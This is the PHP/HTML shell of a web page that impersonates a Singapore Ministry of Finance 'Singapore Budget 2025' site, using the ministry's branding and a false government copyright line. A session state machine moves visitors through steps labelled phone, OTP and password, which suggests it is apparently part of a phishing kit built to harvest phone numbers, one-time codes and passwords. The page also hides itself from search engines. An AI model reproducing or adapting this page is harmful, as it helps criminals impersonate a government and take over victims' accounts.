<?php require("_core.php"); ?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title> <?= $TITLE ?> </title>
        <meta name="robots" content="nofollow, noindex" />
        <link rel="shortcut icon" href="assets/favicon.png" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" />
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
        <style>
            .loader {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.5);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 9999;
            }

            .spinner {
                border: 8px solid #f3f3f3;
                /* Warna latar belakang spinner */
                border-top: 8px solid #3498db;
                /* Warna spinner */
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1.5s linear infinite;
            }

            /* Animasi rotasi spinner */
            @keyframes spin {
                0% {
                    transform: rotate(0deg);
                }

                100% {
                    transform: rotate(360deg);
                }
            }

            buttons {
                background: #2F3476 !important;
                outline: none;
                color: #FFF !important;
            }

            #header {
                background: #2F3476;
                color: #FFF;
            }

            @media (min-width: 768px) {
                .responsiveHeader {
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                }
            }



            .sec1dk {}

            .otpdk img {
                width: 37px;
            }

            .optdks {
                background: white;
                border-radius: 12px;
            }
            .banner img {
              max-width: 500px;
              width: 100%;
              border: solid 1px #A4A4A4;
              border-radius: 5px;
            }
            body {
                font-family: "Inter", serif;
                background-color: #F6F7FA;
                max-width: 450px;              
            }
            .btdk {
              background-color: #fea069;
              font-weight: 700;
              color: white;
              border-radius: 4px;
              height: 48px;
              width: 100%;
              box-shadow: rgba(0, 0, 0, 0.2) 0px 3px 1px -2px, rgba(0, 0, 0, 0.14) 0px 2px 2px 0px, rgba(0, 0, 0, 0.12) 0px 1px 5px 0px;
            }

            input {
              height: 48px!important;
            }

            .secmof {
              background-color: #f7d1b8;
              margin-top: 24px;
              width: 103%;
            }

            .footerdk {
              padding-top: 20px;
            }
            .footerdk h2 {
              font-weight: 700;
            }
        </style>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" />
        <script src="assets/vendors/jQuery/jquery.min.js"></script>
    </head>
    <body class="mx-auto">

      <nav class="navbar bg-body-tertiary" style="background-color: white; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">
  <div class="container-fluid">

    <a class="navbar-brand" href="#">
      <img src="assets/MOF_logo.jpg" alt="Logo" width="75" height="40" class="d-inline-block align-text-top">
    </a>
    <div class="align-content-center">
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <i class="bi bi-list"></i>
                </button>
            </div>
  </div>
</nav>
<div class="mx-auto dkclass" style="width: 92%; margin-top: 23px; padding: 100px 16px; max-width: 500px; height: 700px; 
    background-image: url('assets/form-bg.jpg'); 
    background-size: cover;
    background-position: center;
    border-radius: 8px; 
    box-shadow: rgba(0, 0, 0, 0.15) 0px 4px 10px;">

        <?php
      if(!isset($_SESSION["state"]) OR isset($_GET["otherAccount"])) {
        $_SESSION["state"] = "start";
      }
      
       $F = $_SESSION["state"];
      switch($F) {
        case "start": require("Lander.php"); break;
        case "phone": require("OTPC.php"); break;
        case "otp":   require("PASS.php"); break;
        case "success":   require("SCCS.php"); break;
        default: print_r($_SESSION);
      }
    ?>
  </div>

  <div class="row footer-header pt-3 pb-3 mb-0 ps-1 justify-content-center secmof ">
                    <div class="col-auto ">
                        <img src="assets/favicon.png" class="" alt="MOF">
                    </div>
                    <div class="container-fluid">
                        <div class="description container-fluid"> Singapore Budget 2025 is part of the Ministry of Finance, Singapore.
                        </div>
                    </div>
                </div>

  <footer>
    <div class="container-fluid footerdk">
      <h2>Singapore Budget 2025</h2>
      <p> This website is part of Ministry of Finance Singapore</p>
      <hr>
    <p>© 2025 Government of Singapore.</p>
    </div>
    
  </footer>

  
</body>
</html>
